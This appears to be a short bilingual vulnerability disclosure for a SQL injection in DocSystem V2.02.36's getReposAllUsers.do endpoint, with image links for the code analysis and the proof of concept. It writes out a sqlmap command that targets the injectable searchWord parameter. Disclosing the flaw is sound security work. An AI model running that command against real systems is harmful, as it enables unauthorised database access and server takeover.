# Vulnerability Introduction（漏洞简介）

The /Manage/getReposAllUsers.do interface of DocSystemV2.02.36 has a SQL injection vulnerability.，Attackers can obtain sensitive database information or take over database or even server permissions through this sql injection vulnerability（DocSystemV2.02.36的/Manage/getReposAllUsers.do接口存在SQL注入漏洞。攻击者可以通过此SQL注入漏洞获取敏感的数据库信息，或接管数据库甚至服务器权限）

supplier:https://github.com/RainyGao-GitHub/DocSys/releases/tag/DocSys_V2.02.36

Vulnerability file:src/com/DocSystem/mapping/ReposAuthMapper.xml

# Vulnerability analysis and reproduction（漏洞分析复现）

code analysis

![image-20251228163234956](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228163234956.7snop47d6i.webp)

![image-20251228163308944](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228163308944.2yytszmpp5.webp)

poc

![image-20251228163441955](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228163441955.73uf53jx56.webp)

![image-20251228163500715](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228163500715.3d59juv3au.webp)

python sqlmap.py -r 1.txt -p searchWord --batch --level 3 --risk 3

![image-20251228163507375](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228163507375.8dxcbf1z2g.webp)
